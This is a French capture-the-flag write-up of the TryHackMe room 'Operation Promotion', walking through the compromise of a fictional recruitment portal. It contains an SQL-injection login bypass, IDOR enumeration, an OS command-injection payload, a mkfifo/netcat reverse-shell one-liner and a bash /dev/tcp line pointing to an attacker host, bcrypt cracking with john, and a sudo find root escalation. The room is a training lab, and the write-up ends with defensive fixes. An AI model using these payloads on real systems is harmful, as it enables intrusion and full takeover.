---
title: "TryHackMe - Operation Promotion"
platform: "TryHackMe"
difficulty: "Easy"
tags: [web,sqli,idor,command-injection,rce,privilege-escalation,gtfobins]
---

## Résumé

Operation Promotion est une machine TryHackMe centrée sur un portail carrières web ("RecruitCorp - Careers Portal") exposant du SSH, un serveur web Apache/PHP et un partage Samba. L'exploitation démarre par un contournement d'authentification par injection SQL sur le panneau d'administration, se poursuit par un IDOR permettant l'énumération des comptes de l'application, révèle un endpoint interne vulnérable à une injection de commande OS (RCE), puis se termine par la récupération d'identifiants système via un fichier de configuration exposé et une élévation de privilèges classique via une mauvaise configuration sudo.
## Outils/Technos Utilisés

Reconnaissance

Reconnaissance

- nmap
- gobuster
- smbclient
- enum4linux-ng

Exploitation initiale

- Burp Suite (Repeater)
- Navigateur web / DevTools
- SQL Injection (authentification)
- IDOR (Insecure Direct Object Reference)
- OS Command Injection

Post-exploitation / Élévation de privilèges

- netcat (reverse shell via mkfifo)
-Python (pty.spawn pour la stabilisation de shell)
- john (cracking bcrypt, wordlist ciblée + règles Best64)
- ssh
- GTFOBins (find)

## Reconnaissance

Scan de ports :

```bash
nmap -sC -sV -p- -T4 <<target>>

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: RecruitCorp - Careers Portal
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

Trois services exposés : SSH, un portail web "RecruitCorp" avec un /admin/ déjà signalé par robots.txt, et Samba (nom NetBIOS RECRUITCORP).

Énumération web :

```bash
gobuster dir -u http://<<target>> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

/index.php            (Status: 200)
/admin                (Status: 301) [--> /admin/]
/config               (Status: 403)
```

/admin confirme la piste du robots.txt. /config existe mais renvoie un 403 — dossier à retenir pour plus tard.

Un second passage de gobuster sur /admin/ révèle :

```bash
/admin/index.php       (Status: 200)   -> page de login
/admin/users           (Status: 301)   -> /admin/users/
/admin/logout.php      (Status: 302)
/admin/dashboard.php   (Status: 302)   -> protégé par session
```

Et sur /admin/users/ :

```bash
/admin/users/lookup.php   (Status: 302)   -> protégé par session
```

Énumération SMB :

```bash
smbclient -L //<<target>>/ -N
Sharename       Type      Comment
---------       ----      -------
public          Disk
IPC$            IPC       IPC Service (RecruitCorp File Services)
```

L'accès anonyme est autorisé. Le partage public ne contient qu'un README.txt qui s'avère être un leurre ("Nothing to see here yet. - IT").

```bash
enum4linux-ng -A <<target>>
```

Aucun utilisateur ni groupe exposé via RPC, mais la politique de mot de passe du domaine est révélatrice :

Longueur minimale : 5 caractères
Complexité requise : non
Seuil de verrouillage de compte : aucun

Cette piste SMB s'arrête là, mais confirme une politique de sécurité globalement laxiste sur l'environnement.

## Exploitation initiale

Contournement d'authentification par SQL Injection

Le formulaire de login (/admin/) POST simplement username et password, sans token CSRF ni protection visible. En testant un payload classique de bypass d'authentification dans le champ username :
Le formulaire de login ne filtre pas correctement les entrées. Une injection classique sur le champ username permet de contourner l'authentification :

```bash
POST /admin/ HTTP/1.1

username=admin' --&password=x
```

Réponse : 

```bash
HTTP/1.1 302 Found
Location: /admin/dashboard.php
```

Le payload admin' -- commente la vérification du mot de passe côté requête SQL, permettant une connexion en tant que admin sans connaître le mot de passe.

IDOR sur la fonctionnalité de lookup utilisateur

Une fois authentifié, le dashboard expose une fonctionnalité "User Lookup" :

```bash
GET /admin/users/lookup.php?id=1
```

Le paramètre id est de type number côté HTML, mais cette contrainte est purement côté client. Contrairement au login, id est ici casté en entier côté serveur (les payloads SQLi classiques échouent, y compris OR 1=1 testé sur un id inexistant), donc pas de SQLi possible sur ce paramètre.

En revanche, aucun contrôle d'autorisation n'empêche de consulter le profil de n'importe quel utilisateur en changeant simplement l'id. Énumération complète (id=1 à 9) :

ID	Username	Rôle	            Notes
1	| admin	  | admin	    | Primary admin account.
2	| mvasquez|	recruiter	| Owns the EMEA pipeline.
3	| tparker	| recruiter	| Owns the AMER pipeline.
4	| lhayes	| analyst	  | Reporting only.
5	| kchen	  | recruiter	| Out on leave.
6	| rdavis	| analyst 	| Reporting only.
7	| sysmaint|	system	  | Service account for /admin/sysmaint-checks/ping.php. Do not disable.
8	| jbailey	| recruiter	| New starter Q3.
9	| aokafor	| recruiter	| APAC.

La fiche du compte sysmaint (id=7) révèle un endpoint interne jusque-là inconnu : /admin/sysmaint-checks/ping.php.

Command Injection (RCE) sur l'endpoint de diagnostic

```bash
GET /admin/sysmaint-checks/ping.php
```

```bash
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

Le paramètre host est transmis directement à une commande système ping, sans validation ni échappement. Un test avec host=127.0.0.1 retourne la sortie brute de ping, confirmant l'hypothèse.

En chaînant une seconde commande avec && (encodé en %26%26 pour ne pas casser la query string) :

```bash
GET /admin/sysmaint-checks/ping.php?host=127.0.0.1%26%26whoami
```

La sortie de whoami (www-data) apparaît en fin de réponse, confirmant l'injection de commande OS.

Obtention d'un shell interactif

Un premier essai de reverse shell classique via la fonctionnalité /dev/tcp de bash a échoué silencieusement, alors même que :

- la connectivité réseau cible → attaquant était confirmée (ICMP + test TCP nc -zv réussi sur le port choisi)
- bash était bien présent sur la cible (/usr/bin/bash)

Cause : les paquets bash de Debian/Ubuntu sont compilés sans le support de /dev/tcp, désactivé volontairement pour des raisons de sécurité. La technique bash -i >& /dev/tcp/<<attacker>>/<<port>> 0>&1 ne fonctionne donc pas sur cette cible malgré la présence de bash.

Contournement avec une technique reverse shell basée sur un pipe nommé et nc (déjà confirmé présent sur la cible) :

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <<attacker>> <<port>> >/tmp/f
```

Shell obtenu en tant que www-data, puis stabilisé en pseudo-terminal complet :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Élévation de privilèges

Découverte d'identifiants dans un fichier de configuration exposé

Le dossier /config (403 en accès web direct, repéré dès le début de la recon) est en réalité accessible via le shell obtenu, www-data ayant les droits de lecture sur les fichiers de l'application :

```bash
cat /var/www/html/config/db.conf

# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=<<CENSURE>>
db_engine=sqlite3
```

Le username jford ne correspond à aucun des 9 comptes de l'application — vérification dans /etc/passwd :

```bash
jford:x:1001:1001::/home/jford:/bin/bash
```

Il s'agit bien d'un compte système, avec un shell valide (candidat SSH).

Cracking ciblé du hash

Plutôt qu'un bruteforce générique (coûteux sur du bcrypt), la page d'accueil du site mentionnait un indice contextuel : "Spring 2026 Hiring Drive". Une wordlist ciblée a été générée à partir de ce mot-clé grâce aux règles de mutation intégrées de john :

```bash
echo "Spring2026" > base.txt
john --wordlist=base.txt --rules=Best64 --stdout > spring_mutations.txt

john hash.txt --wordlist=spring_mutations.txt --format=bcrypt
```

Le mot de passe a été cassé en une trentaine de secondes.

Accès SSH et flag utilisateur

```bash
ssh jford@<<target>>
# password: <<CENSURE>>

jford@recruitcorp:~$ cat user.txt
<<CENSURE>>
```

Abus d'une règle sudo mal configurée (GTFOBins)

```bash
sudo -l

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

find est un binaire classiquement référencé sur GTFOBins pour l'évasion de privilèges via son option -exec :

```bash
sudo find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

Shell root obtenu.

## Flags Trouvés

- user.txt : <<CENSURE>>
- root.txt : <<CENSURE>>

## Conclusion

Cette room illustre bien comment plusieurs vulnérabilités de sévérité modérée, prises individuellement, peuvent s'enchaîner pour aboutir à une compromission complète du système :

Une SQL Injection d'authentification sur un formulaire de login sans protection ni validation d'entrée
Un IDOR permettant de contourner tout contrôle d'accès sur une fonctionnalité interne, menant à la découverte d'un endpoint caché
Une Command Injection sur un outil de diagnostic interne insuffisamment protégé
Un fichier de configuration sensible oublié sur le serveur de production (avec, ironie du sort, un commentaire rappelant qu'il ne devrait pas s'y trouver)
Un mot de passe prévisible, dérivé du contexte métier de l'entreprise
Une règle sudo trop permissive sur un binaire connu pour permettre une évasion (find)

Chaque étape prise isolément aurait pu être neutralisée par une bonne pratique simple : requêtes préparées, contrôle d'autorisation systématique côté serveur, validation stricte des entrées utilisateur avant tout appel système, gestion des secrets hors du webroot, politique de mot de passe robuste, et principe du moindre privilège sur les règles sudo.

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
